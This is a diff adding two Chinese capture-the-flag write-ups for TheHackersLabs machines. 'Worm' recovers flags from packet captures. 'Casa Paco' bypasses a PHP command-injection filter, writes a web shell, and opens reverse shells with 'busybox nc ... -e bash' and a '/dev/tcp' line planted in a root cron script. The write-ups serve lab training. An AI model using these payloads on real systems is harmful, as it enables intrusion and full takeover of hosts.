@@ -3848,3 +3848,175 @@ root@Torrija-TheHackersLabs:/home/primo# whoami
 root
 ```
 
+## Worm
+
+> **提示:** 靶机跳转传送门
+> [Worm](https://labs.thehackerslabs.com/machines/148)
+
+<img src="/assets/img/thehackerslabs-notes/worm.png" alt="Worm" style="zoom:50%;" />
+
+> 感谢Sublarge，他做出来给我指点，然后我才解决的
+
+这题还是蛮抽象的，我之前没见过这也的，首先用nmap扫描，发现靶机没有开放任何端口，然后我用wireshark抓包，发现靶机在疯狂对外进行ARP广播，这也是第一题的答案，接下来分析流量，追踪了几个http流量，获取了第二和第三题的答案
+
+```wiki
+GET /a79.htm HTTP/1.0
+Host: 10.10.244.11
+User-Agent: Mozilla/5.0 (W0rMH0lE; THL{VGllbmVzIGxhIHByaW1lcmEgYmFuZGVyYSwgRmVsaWNpZGFkZXMK})
+Accept: */*
+
+```
+
+然后再追踪下其他流量，比如说icmp，会发现末尾跟了串hex
+
+<img src="/assets/img/thehackerslabs-notes/image-20251123150604651.png" alt="image-20251123150604651" style="zoom:50%;" />
+
+```text
+34383635373837623437346632313764343836353738376234373466323137643438363537383762
+```
+
+<img src="/assets/img/thehackerslabs-notes/image-20251123150648186.png" alt="image-20251123150648186" style="zoom:50%;" />
+
+解密获取flag
+
+## Casa Paco
+> **提示:** 靶机跳转传送门
+> [Casa Paco](https://labs.thehackerslabs.com/machines/18)
+
+<img src="/assets/img/thehackerslabs-notes/casapaco.png" alt="Casa Paco" style="zoom:50%;" />
+
+### 信息搜集
+
+```bash
+(base) yolo@yolo:~$ nmap -sV -Pn 10.161.186.4
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-23 15:10 CST
+Nmap scan report for 10.161.186.4
+Host is up (0.81s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.62
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.47 seconds
+(base) yolo@yolo:~$ curl http://10.161.186.4
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>302 Found</title>
+</head><body>
+<h1>Found</h1>
+<p>The document has moved <a href="http://casapaco.thl">here</a>.</p>
+<hr>
+<address>Apache/2.4.62 (Debian) Server at 10.161.186.4 Port 80</address>
+</body></html>
+```
+
+这里需要更改hosts，将下面内容追加到hosts后面就ok
+
+`10.161.186.4 casapaco.thl`
+
+接下来web网页中，看到这里，我们可以想办法然后限制执行命令
+
+<img src="/assets/img/thehackerslabs-notes/image-20251123162724462.png" alt="image-20251123162724462" style="zoom:50%;" />
+
+先读读文件吧，这里我直接用**`base64 llevar.php`**查看当前代码，解码后可以读到限制条件
+
+```php
+  <?php
+        if ($_SERVER["REQUEST_METHOD"] === "POST") {
+            $name = htmlspecialchars($_POST["name"]);
+            $dish = $_POST["dish"];
+
+            // Filtro para bloquear comandos simples
+            $pattern_blacklist = '/\b(whoami|ls|pwd|cat|sh|bash)\b/i';
+            if (preg_match($pattern_blacklist, $dish)) {
+                die('<p style="color: red;">Error: Pide comida no intentes hackearme. Los callos estan muy ricos.</p>');
+            }
+
+            // Permitir solo caracteres y estructuras de comandos mÃ¡s complejas
+            $allowed_pattern = '/^[a-zA-Z0-9\s\$\(\)\-\_\.\|]*$/';
+            if (!preg_match($allowed_pattern, $dish)) {
+                die('<p style="color: red;">Error: Pide comida no intentes hackearme. Los callos estan muy ricos.</p>');
+            }
+
+            // Comando vulnerable
+            $output = shell_exec("$dish");
+
+            echo '<section class="confirmation">';
+            echo '<h3>Pedido confirmado</h3>';
+            echo "<p>Gracias, <strong>$name</strong>. Tu pedido de <strong>$dish</strong> estarÃ¡ listo para llevar.</p>";
+            echo '<h3>Salida del Comando:</h3>';
+            echo "<pre>$output</pre>";
+            echo '</section>';
+        }
+        ?>
+```
+
+看上去还蛮严格的，我这里绕了半个小时，算是拿到一个万能payload
+
+```bash
+echo php木马(base64) | base64 -d | tee shell.php
+```
+
+这样做就能写入任意木马文件，比如说`<?php system($_GET['cmd']);?>`然后访问那个shell.php路由，再传递cmd参数，把shell弹出来
+
+```text
+http://casapaco.thl/shell.php?cmd=busybox nc 10.161.185.232 1234 -e bash
+```
+
+### get shell
+
+维持完shell,接下来直接进入家目录下面
+
+```bash
+www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ ls -la
+total 40
+drwxr-xr-x 3 pacogerente pacogerente 4096 Jan 14  2025 .
+drwxr-xr-x 3 root        root        4096 Jan 14  2025 ..
+lrwxrwxrwx 1 root        root           9 Jan 14  2025 .bash_history -> /dev/null
+-rw-r--r-- 1 pacogerente pacogerente  220 Mar 29  2024 .bash_logout
+-rw-r--r-- 1 pacogerente pacogerente 3526 Mar 29  2024 .bashrc
+drwxr-xr-x 3 pacogerente pacogerente 4096 Jan 13  2025 .local
+-rw-r--r-- 1 pacogerente pacogerente  807 Mar 29  2024 .profile
+-rwxrw-rw- 1 pacogerente pacogerente   88 Nov 23 09:24 fabada.sh
+-rw-r--r-- 1 root        root        4888 Nov 23 09:22 log.txt
+-rw-r--r-- 1 pacogerente pacogerente   33 Jan 14  2025 user.txt
+```
+
+这里有个严重漏洞，就是pacogerente创建的fabada.sh文件任意用户都可写，然后我再看看定时任务
+
+```bash
+www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ ls /etc/cron.d
+e2scrub_all  php  vuln_cron
+www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ cat /etc/cron.d/vuln_cron
+* * * * * root /home/pacogerente/fabada.sh
+
+```
+
+这里的配置很严重了，我都不用拿到pacogerente用户的权限，直接修改fabada.sh拿到root的shell
+
+写入内容也很简单，就是弹shell到本地
+
+```bash
+www-data@Thehackerslabs-CasaPaco:/home/pacogerente$ cat fabada.sh
+#!/bin/bash
+
+# Generar un log de actividad
+bash -i >& /dev/tcp/10.161.185.232/4444 0>&1
+```
+
+然后新开终端等待反弹shell
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.161.185.232] from (UNKNOWN) [10.161.186.4] 35970
+bash: no se puede establecer el grupo de proceso de terminal (1496): Función ioctl no apropiada para el dispositivo
+bash: no hay control de trabajos en este shell
+root@Thehackerslabs-CasaPaco:~# id
+id
+uid=0(root) gid=0(root) grupos=0(root)
+```
+
